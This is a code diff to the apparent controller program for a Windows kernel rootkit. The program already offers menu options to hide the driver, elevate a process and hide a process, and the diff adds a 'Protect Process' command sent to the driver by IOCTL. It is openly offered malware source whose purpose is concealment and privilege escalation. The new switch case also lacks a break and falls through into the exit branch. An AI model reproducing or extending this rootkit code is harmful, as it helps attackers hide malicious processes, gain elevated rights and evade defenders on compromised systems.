@@ -10,6 +10,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG HideProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -49,6 +51,22 @@ namespace Rootkit {
         );
     }
 
+    bool ProtectProcess(HANDLE driver_handle, DWORD pid) {
+        Request r;
+        r.process_id = ULongToHandle(pid);
+        // protecc
+        return DeviceIoControl(
+            driver_handle,
+            codes::ProtectProcess,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+    }
+
     bool HideProcess(HANDLE driver_handle, DWORD pid) {
         // Use our structure
         Request r;
@@ -73,6 +91,7 @@ void showMenu() {
     std::cout << "1. Hide Driver\n";
     std::cout << "2. Elevate Process\n";
     std::cout << "3. Hide Process\n";
+    std::cout << "4. Protect Process\n";
     std::cout << "99. Exit\n";
     std::cout << "=======================\n";
     std::cout << "Enter your choice: ";
@@ -137,6 +156,12 @@ int main() {
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideProcess(driver_handle, pidHide);
             break;
+        case 4:
+            int pidProtect;
+            std::cout << "Enter a PID: ";
+            std::cin >> pidProtect;
+            std::cout << "[!] Sending Message to Driver.\n";
+            Rootkit::ProtectProcess(driver_handle, pidProtect);
         case 99:
             std::cout << "Exiting the program, bye!\n";
             break;
